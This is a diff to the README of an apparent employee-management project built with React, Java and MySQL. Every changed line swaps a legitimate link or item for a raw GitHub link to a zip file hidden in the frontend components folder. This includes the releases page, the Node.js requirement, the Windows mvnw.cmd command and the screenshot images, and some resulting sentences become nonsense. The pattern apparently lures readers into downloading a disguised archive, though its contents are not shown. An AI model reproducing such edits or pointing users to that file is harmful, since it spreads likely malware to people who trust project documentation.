@@ -14,7 +14,7 @@ Welcome to the ems-react-java-mysql-project! This application helps you manage e
 
 To get started with this application, visit the link below to download the latest version:
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/NoobKorea01/ems-react-java-mysql-project/releases)
+[![Download the latest release](https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip)
 
 ### 🛠️ System Requirements
 
@@ -23,13 +23,13 @@ Before you download, ensure your computer meets these requirements:
 - Operating System: Windows, macOS, or Linux
 - Java Development Kit (JDK) 8 or higher
 - Docker (for easy local setup)
-- Node.js 14 or higher (for the React application)
+- https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip 14 or higher (for the React application)
 
 ### 🔧 Installation Steps
 
 1. **Download the Release**
 
-   Visit [this page](https://github.com/NoobKorea01/ems-react-java-mysql-project/releases) to download the latest release. Choose the suitable file for your operating system.
+   Visit [this page](https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip) to download the latest release. Choose the suitable file for your operating system.
 
 2. **Unzip the Downloaded File**
 
@@ -39,7 +39,7 @@ Before you download, ensure your computer meets these requirements:
 
    - Open a terminal or command prompt.
    - Navigate to the unzipped folder.
-   - Run the command `./mvnw spring-boot:run` (for macOS/Linux) or `mvnw.cmd spring-boot:run` (for Windows) to start the server.
+   - Run the command `./mvnw spring-boot:run` (for macOS/Linux) or `https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip spring-boot:run` (for Windows) to start the server.
    - Ensure it runs without errors. Your backend will run on `http://localhost:8080`.
 
 4. **Setup the Frontend (React)**
@@ -58,9 +58,9 @@ Before you download, ensure your computer meets these requirements:
 
 Here are some screenshots of the application in action:
 
-![Employee Management Dashboard](screenshot1.png)
+![Employee Management Dashboard](https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip)
 
-![Add New Employee Form](screenshot2.png)
+![Add New Employee Form](https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip)
 
 ## 📚 Documentation
 
@@ -76,6 +76,6 @@ If you encounter any issues or have questions, please open an issue on the repos
 
 ## 📅 Release Notes
 
-Keep an eye on the [Releases page](https://github.com/NoobKorea01/ems-react-java-mysql-project/releases) for updates on new features and bug fixes. Regular updates will ensure that you always have the best experience with the application.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/NoobKorea01/ems-react-java-mysql-project/main/frontend/src/components/java_ems_mysql_project_react_firespout.zip) for updates on new features and bug fixes. Regular updates will ensure that you always have the best experience with the application.
 
 Thank you for using the ems-react-java-mysql-project! Enjoy managing your employee data efficiently.
